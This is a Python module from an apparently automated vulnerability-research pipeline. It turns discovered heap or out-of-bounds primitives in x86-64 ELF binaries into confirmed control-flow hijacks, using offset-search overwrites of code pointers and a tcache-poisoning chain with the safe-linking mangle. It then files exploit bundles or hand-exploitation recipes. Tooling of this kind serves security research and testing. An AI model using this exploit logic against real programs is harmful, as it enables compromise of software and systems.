"""Primitive chaining: turn a discovered heap / out-of-bounds primitive into a DEMONSTRATED
control-flow hijack (L3), or an L2 exploitation recipe when a live win is not reachable.

The `heap_trace` (double-free / UAF / heap-overflow) and `oob_index` (CWE-129) stages discover a
memory-corruption PRIMITIVE but file a Finding that goes nowhere. This stage consumes that lead and
attempts to finish the chain: when the target has a reachable win function (a flag printer / shell
spawner, via `exploit.find_win`), it drives the primitive's menu option to overwrite an adjacent
CODE pointer with the win address, triggers the use, and CONFIRMS control reached the win under the
ptrace debugger -- with the same negative-control causation proof `build_exploit` uses. On success
it files an L3 `verified` poc; otherwise it emits the concrete `aaheg` technique + target recipe as
L2 analyst guidance. Native x86-64 / ELF; the live-confirm path is non-PIE (a PIE win needs a
leak, which stays analyst-gated). Deterministic. """
from __future__ import annotations

import re
import shutil
import struct
import sys
import tempfile
from pathlib import Path

from ...jobs.registry import register_stage

# NOTE: cross-subpackage imports (..dynamic, ..fuzz, sibling poc modules) are done LAZILY inside the
# functions below -- importing at module load creates a poc <-> dynamic import cycle (poc.__init__
# imports this module, which would import dynamic.heap_discover, which imports back into poc).

CHAIN_STAGE = "chain_primitive"
TOOL_VERSION = "chain-1"
_NL = b"\n"
# CWE -> the aaheg vuln class the discovered primitive represents.
_VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
           "CWE-129": "oob_write"}
_LEAD_DETECTORS = ("heap_trace", "oob_index")


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _drive_overflow(fields, payload: bytes, *, idx: bytes = b"1", num: bytes = b"999",
                    width=None) -> bytes:
    """One invocation of an option whose LAST string field carries the raw overflow `payload`
    (filler + the code address). A leading size field is driven large so the copy is unbounded."""
    from ..fuzz import menu
    last_str = max((i for i, f in enumerate(fields) if f == "str"), default=len(fields) - 1)
    out = bytearray()
    for i, f in enumerate(fields):
        if i == last_str:
            out += menu._data(payload, width)
        elif f == "idx":
            out += menu._scalar(idx, width)
        elif f == "num":
            out += menu._scalar(num, width)
        else:
            out += menu._data(b"AAAA", width)
    if not fields:                                       # option with no learned fields
        out += menu._data(payload, width)
    return bytes(out)


def _lead_finding(conn, target):
    """The discovered primitive to chain: the highest-confidence heap_trace / oob_index finding."""
    from ...db.dao import FindingDAO
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.detector in _LEAD_DETECTORS and f.cwe in _VCLASS]
    return max(leads, key=lambda f: f.confidence, default=None)


def _recipe(vclass: str, win, target_bytes: bytes) -> dict:
    """An aaheg technique + concrete write target when a live hijack is not demonstrable."""
    from . import aaheg
    goal = (aaheg.Goal(kind="control_flow", value=(win[1] if win else 0),
                       trigger="overwrite a called code pointer with the win address")
            if win else aaheg.Goal(kind="arbitrary_write"))
    if vclass == "oob_write":
        # not a heap technique: the index escapes the array bounds -> write through the OOB slot
        return {"technique": "oob-index-write", "goal": goal.kind,
                "note": ("write a chosen value through the out-of-bounds array slot; aim it at a "
                         "saved return / GOT entry / function pointer, then trigger its use")}
    plan = aaheg.plan_exploit(aaheg.Vuln(vclass=vclass), goal)
    plan["technique"] = plan.get("technique") or (plan.get("advisory_alternatives") or [{}])[0].get(
        "technique", "tcache-poison")
    return plan


def chain_primitive_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, StringDAO, TargetDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import _crawl_menu_model
    from ..fuzz import menu
    from . import exploit
    from .capture import make_capture, materialize_helper
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("chain_primitive requires a target_id")
    host = sandbox.host_arch()
    if (target.arch and target.arch != host) or (target.file_type or "").lower() not in ("elf", ""):
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "primitive chaining is native x86-64 / ELF only"})
        return {}

    lead = _lead_finding(ctx.conn, target)
    if lead is None:
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "no heap / out-of-bounds primitive discovered to chain"})
        ctx.progress(pct=100, msg="no primitive lead to chain")
        return {}
    vclass = _VCLASS[lead.cwe]

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    win = exploit.find_win(functions, call_edges=edges)
    win = win if win[0] else None
    pie = (target.mitigations or {}).get("pie") == "on"

    # Without a reachable win, or on a PIE image (the win address needs a runtime leak), we cannot
    # DEMONSTRATE the hijack here -- emit the concrete technique + target recipe as L2 guidance.
    if win is None or pie:
        recipe = _recipe(vclass, win, target_bytes)
        why = ("no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
               if win is None else "PIE: the win address needs a runtime leak first")
        _file_recipe(ctx, target, lead, vclass, win, recipe, why)
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
                 "win": win[0] if win else None, "recipe": recipe.get("technique"), "note": why})
        ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
        return {"metrics": {"chained": False, "vclass": vclass}}

    win_name, win_addr = win
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        exe.write_bytes(target_bytes)
        exe.chmod(0o755)
        from ..dynamic.heap_discover import _read_width
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width = _read_width(exe)                          # fixed-width read(fd,buf,W) protocol?
        model = _crawl_menu_model(workdir, exe, opts, width=width) if opts else {}

        helper = materialize_helper()
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        try:
            if vclass in ("double_free", "uaf"):
                # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                   model, width, workdir, capture)
                if tc:
                    seq, tgt, trig = tc
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                    off=None, trig=trig)
            else:
                # heap overflow / oob write -> overwrite an adjacent code pointer directly
                alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
                prime = (2 * (menu._scalar(alloc.encode(), width)
                              + menu._fill(model[alloc], width=width))) if alloc else b""
                writers = [o for o in opts if o in model and "str" in model[o]] or opts
                found = _search_hijack(ctx, capture, prime, model, writers, list(opts) + [None],
                                       win_addr, width=width)
                if found:
                    seq, writer, off, trig = found
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"option {writer} overwrites a code pointer at +{off}",
                                    writer=writer, off=off, trig=trig)
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)

        recipe = _recipe(vclass, win, target_bytes)
        _file_recipe(ctx, target, lead, vclass, win, recipe,
                     f"drove {vclass} but control never reached {win_name}")
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                 "vclass": vclass, "win": win_name})
        ctx.progress(pct=100, msg=f"{vclass} chain to {win_name} not confirmed (L2 recipe)")
        return {"metrics": {"chained": False, "vclass": vclass}}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, width=None):
    """Overwrite an adjacent code pointer with `win_addr` and confirm the trigger calls it.

    Search the (writer option, overwrite offset, trigger option) space: place win_addr at each
    8-byte offset of an over-long payload from a data-writing option, then drive each candidate
    trigger. Confirm = the win breakpoint is hit AND a negative control (win bytes replaced) does
    NOT hit it, proving the overwrite caused arrival. Bounded; early-exits on the first hijack."""
    from ..fuzz import menu
    from . import exploit
    attempts = 0
    for writer in writers:
        wf = model.get(writer, [])
        for widx in (b"0", b"1"):                        # object whose buffer we overflow
            for off in range(8, 72, 8):
                drive = menu._scalar(writer.encode(), width) + _drive_overflow(
                    wf, b"A" * off + _p64(win_addr), idx=widx, width=width)
                for trig in triggers:
                    # the object the trigger uses: usually the one ADJACENT to the overflow.
                    for tidx in ((None,) if trig is None else (b"1", b"0")):
                        if ctx.should_cancel() or attempts >= 260:
                            return None
                        attempts += 1
                        tail = b"" if trig is None else (
                            menu._scalar(trig.encode(), width)
                            + menu._fill(model.get(trig, []), idx=tidx, width=width))
                        seq = prime + drive + tail
                        if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                            continue
                        neg = prime + menu._scalar(writer.encode(), width) + _drive_overflow(
                            wf, b"A" * off + b"C" * 8, idx=widx, width=width) + tail
                        if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                            continue                     # reached without the overwrite -> not ours
                        ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                         f"a code pointer at +{off} -> win reached")
                        return seq, writer, off, trig
    return None


# ------------------------------------------------------- live tcache-poisoning (double-free / UAF)
def _writable_globals(exe) -> list[int]:
    """16-aligned writable-global addresses referenced by the code -- candidate function-pointer
    targets to allocate a chunk over. 16-aligned because glibc 2.32+ rejects an unaligned tcache
    chunk. Both an absolute displacement and objdump's computed `# <vaddr>` (PIE) are read."""
    import subprocess

    from ..dynamic.oob_index import _data_ranges
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", "-M", "intel", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    ranges = _data_ranges(exe)

    def in_data(a):
        return any(s <= a < e for s, e in ranges)

    seen = set()
    for m in re.finditer(r"(?:\+0x([0-9a-fA-F]+)\]|#\s*([0-9a-fA-F]+)\b)", out):
        a = int(m.group(1) or m.group(2), 16)
        if a % 16 == 0 and in_data(a):
            seen.add(a)
    return sorted(seen)[:12]


def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
    """Run the drive under the heaptrace ptrace helper and return the FIRST chunk address it
    allocates (deterministic under ASLR-off) -- the value the safe-linking fd mangle needs. Runs the
    helper DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap
    layout matches the capture() runs the exploit is confirmed under."""
    import json

    from ..dynamic import heap_discover
    plt = bool(alloc_info.get("plt"))
    ret_offs = [] if plt else heap_discover._alloc_ret_offsets(exe, alloc_info["alloc_name"])
    helper = workdir / "heaptrace.py"
    if not helper.exists():
        helper.write_bytes((Path(heap_discover.__file__).with_name("heaptrace.py")).read_bytes())
    report = workdir / "areport.json"
    report.unlink(missing_ok=True)
    (workdir / "aspec.json").write_text(json.dumps({
        "exe": str(exe), "stdin": drive.hex(), "free_off": alloc_info["free"],
        "alloc_off": alloc_info["alloc"], "alloc_ret_offs": ret_offs, "alloc_is_plt": plt,
        "pie": False, "ignore_ranges": [], "report": str(report), "timeout": 6}))
    try:
        ctx.run_subprocess([sys.executable, str(helper), str(workdir / "aspec.json"),
                            str(report)], timeout=12)
        addrs = json.loads(report.read_text()).get("alloc_addrs") or []
    except Exception:
        return None
    return int(addrs[0], 16) if addrs else None


def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                  workdir, capture):
    """Drive a live tcache-poisoning chain: free a chunk, overwrite its fd (via the UAF/double-free)
    with a mangled pointer to a code-pointer target, allocate twice to obtain a chunk AT the target,
    write the win address there, and trigger. Confirms control reached the win under the debugger,
    with a negative control. ASLR-off makes the chunk address (hence the safe-linking mangle)
    deterministic. Returns (sequence, target, trigger) on success, else None."""
    from ..dynamic import heap_discover, heaptrace
    from ..fuzz import menu
    from . import exploit
    alloc_info = heaptrace.identify_allocator(functions, edges) or heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    alloc_opt = next((o for o in opts if o in model and "num" in model[o]), None)
    free_opt = next((o for o in opts if o in model and model[o] == ["idx"]), None)
    edit_opt = next((o for o in opts if o in model and model[o][:1] == ["idx"]
                     and "str" in model[o]), None)
    if not (alloc_opt and free_opt and edit_opt):
        return None
    targets = _writable_globals(exe)
    if not targets:
        return None
    win_name, win_addr = win

    def _op(opt, num=None):                               # an alloc/menu option, size = num
        return menu._scalar(opt.encode(), width) + menu._fill(
            model[opt], num=(str(num).encode() if num is not None else b"16"), width=width)

    def _idx_op(opt, idx):                                # a free option on index `idx`
        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)

    def _edit(idx, payload, pad):                         # edit index `idx`, write raw `payload`
        return (menu._scalar(edit_opt.encode(), width) + menu._scalar(str(idx).encode(), width)
                + menu._data(payload.ljust(pad, b"\x00"), width))

    # the freed chunk's address (for the safe-linking mangle): trace one allocation.
    a = _trace_first_alloc(ctx, exe, alloc_info, _op(alloc_opt, 24) + _idx_op("9", 0),
                           width, workdir)
    if not a:
        return None

    for size in (24, 16, 40):
        for pad in (size, 24, 32):
            for tgt in targets:
                if ctx.should_cancel():
                    return None
                mangled = (a >> 12) ^ tgt                 # glibc >= 2.32 safe-linking
                poison = (_op(alloc_opt, size) + _idx_op(free_opt, 0) + _edit(0, _p64(mangled), pad)
                          + _op(alloc_opt, size) + _op(alloc_opt, size)
                          + _edit(2, _p64(win_addr), pad))
                for trig in opts:
                    seq = poison + _idx_op(trig, 0)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(alloc_opt, size) + _idx_op(free_opt, 0)
                           + _edit(0, _p64(mangled), pad)
                           + _op(alloc_opt, size) + _op(alloc_opt, size)
                           + _edit(2, _p64(0xdead), pad) + _idx_op(trig, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our write -> not ours
                    ctx.progress(msg=f"tcache-poison: chunk over {hex(tgt)} -> {win_name} "
                                     f"(size {size}, trigger {trig})")
                    return seq, tgt, trig
    return None


def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, writer, off, trig):
    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    input_sha = ctx.put_artifact("chain-exploit-input", data=seq)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow", "offset": off, "target": win_name,
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(),
                        seq, meta, b"", "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working exploit ({vclass} -> control-flow hijack): {blame} to {win_name} "
           f"(0x{win_addr:x}); {trg} then calls it, arrival confirmed under the debugger with a "
           f"passing negative control.")
    fd = FindingDAO(ctx.conn)
    cand = {
        "cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 working exploit",
        "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
        "confidence": 0.99, "authoritative": True, "title_only": True,
        "dedup_key": f"chain:{vclass}:{target.id}",
        "function_addr": None, "site_addr": None, "site_detail": win_name,
        "evidence": [{"channel": "effects", "detail": __import__("json").dumps([{
            "kind": "rce", "title": "Control-flow hijack", "status": "demonstrated", "detail": eff,
            "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                      "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "offset": off, "writer": writer, "trigger": trig,
             "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}


def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
    """L2 guidance: the concrete technique + target to finish the chain by hand."""
    from ...db.dao import FindingDAO
    tech = recipe.get("technique", "heap-technique")
    tgt = f" -> {win[0]} (0x{win[1]:x})" if win else ""
    detail = (f"{vclass} primitive can be chained via {tech}{tgt}, but a live hijack was not "
              f"demonstrated here ({why}). {recipe.get('note', '')}").strip()
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": lead.cwe, "title": f"Exploitation recipe: {vclass} -> {tech}",
        "severity": "high", "detector": "chain_primitive", "state": "corroborated",
        "confidence": 0.5, "dedup_key": f"chain-recipe:{vclass}:{target.id}",
        "site_detail": tech,
        "evidence": [{"channel": "chain", "detail": detail}]})


def register() -> None:
    register_stage(CHAIN_STAGE, chain_primitive_stage, resource_class="cpu",
                   tool="ptrace", tool_version=TOOL_VERSION)


def enqueue_chain(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, CHAIN_STAGE, target_id=target.id,
                         params=params or {}, force=force)
